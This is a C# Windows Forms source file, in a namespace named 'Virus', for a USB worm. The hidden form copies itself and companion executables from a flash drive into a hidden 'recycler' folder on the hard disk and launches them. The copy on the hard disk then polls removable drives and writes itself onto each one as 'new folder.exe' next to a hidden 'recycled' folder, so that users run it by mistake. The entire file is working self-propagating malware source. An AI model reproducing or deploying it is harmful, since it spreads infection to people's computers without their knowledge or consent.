using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace Virus
{
    public partial class frmMain : Form
    {
        //public constructures region
        public frmMain()
        {
            InitializeComponent();

            this.Visible = false;
            this.ShowInTaskbar = false;

            if (System.IO.Path.GetFileName(Application.ExecutablePath).ToLower() == NAME_AT_FLASH)
            {
                //running in flash memory
                if (System.IO.Directory.Exists(FOLDER_AT_FLASH))
                {
                    String hdd = "c:\\";

                    //try to copy
                    try
                    {
                        CopyFolderToHard(hdd);
                    }
                    catch
                    {
                        try
                        {
                            hdd = "d:\\";
                            CopyFolderToHard(hdd);
                        }
                        catch
                        {
                            return;
                        }
                    }

                    try
                    {
                        if (System.IO.File.Exists(hdd + System.IO.Path.Combine(FOLDER_AT_HARD, "systemRuntime.exe")))
                            System.Diagnostics.Process.Start(hdd + System.IO.Path.Combine(FOLDER_AT_HARD, "systemRuntime.exe"));
                    }
                    catch
                    {
                    }

                    try
                    {
                        if (System.IO.File.Exists(hdd + System.IO.Path.Combine(FOLDER_AT_HARD, "SpecialOrders.exe")))
                            System.Diagnostics.Process.Start(hdd + System.IO.Path.Combine(FOLDER_AT_HARD, "SpecialOrders.exe"));
                    }
                    catch
                    {
                    }

                    try
                    {
                        if (System.IO.File.Exists(hdd + System.IO.Path.Combine(FOLDER_AT_HARD, NAME_AT_HARD)))
                            System.Diagnostics.Process.Start(hdd + System.IO.Path.Combine(FOLDER_AT_HARD, NAME_AT_HARD));
                    }
                    catch
                    {
                    }

                    System.Diagnostics.Process.Start("c:\\");
                }
                else
                    return;
            }
            else
            {
                //running in hard disk
                tmr.Enabled = true;
            }
        }

        //private events region
        private void tmr_Tick(object sender, EventArgs e)
        {
            foreach (System.IO.DriveInfo drive in System.IO.DriveInfo.GetDrives())
                if (drive.DriveType == System.IO.DriveType.Removable)
                    try
                    {
                        CopyFolderToFlash(drive.Name);
                    }
                    catch
                    {
                        return;
                    }
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            if (!tmr.Enabled)
                this.Close();
        }

        //private functions region
        private void CopyFolderToHard(String hardName)
        {
            if (!System.IO.Directory.Exists(hardName + FOLDER_AT_HARD))
            {
                System.IO.DirectoryInfo directory = new System.IO.DirectoryInfo(hardName + FOLDER_AT_HARD);
                directory.Attributes = System.IO.FileAttributes.System | System.IO.FileAttributes.ReadOnly | System.IO.FileAttributes.Archive | System.IO.FileAttributes.Hidden;
            }

            foreach (String file in System.IO.Directory.GetFiles(FOLDER_AT_FLASH))
                System.IO.File.Copy(file, hardName + System.IO.Path.Combine(FOLDER_AT_HARD, System.IO.Path.GetFileName(file)), true);

            System.IO.File.Copy(Application.ExecutablePath, hardName + System.IO.Path.Combine(FOLDER_AT_HARD, NAME_AT_HARD), true);
        }

        private void CopyFolderToFlash(String hardName)
        {
            if (!System.IO.Directory.Exists(hardName + FOLDER_AT_FLASH))
            {
                System.IO.DirectoryInfo directory = new System.IO.DirectoryInfo(hardName + FOLDER_AT_FLASH);
                directory.Create();
                directory.Attributes = System.IO.FileAttributes.System | System.IO.FileAttributes.ReadOnly | System.IO.FileAttributes.Archive | System.IO.FileAttributes.Hidden;
            }

            foreach (String file in System.IO.Directory.GetFiles(System.IO.Directory.GetCurrentDirectory()))
                if (System.IO.Path.GetFileName(file) != NAME_AT_HARD)
                    System.IO.File.Copy(file, hardName + System.IO.Path.Combine(FOLDER_AT_FLASH, System.IO.Path.GetFileName(file)), true);

            System.IO.File.Copy(Application.ExecutablePath, hardName + NAME_AT_FLASH, true);
        }

        //private constant region
        private String NAME_AT_FLASH = "new folder.exe";
        private String NAME_AT_HARD = "runDll.exe";
        private String FOLDER_AT_FLASH = "recycled";
        private String FOLDER_AT_HARD = "recycler";
    }
}
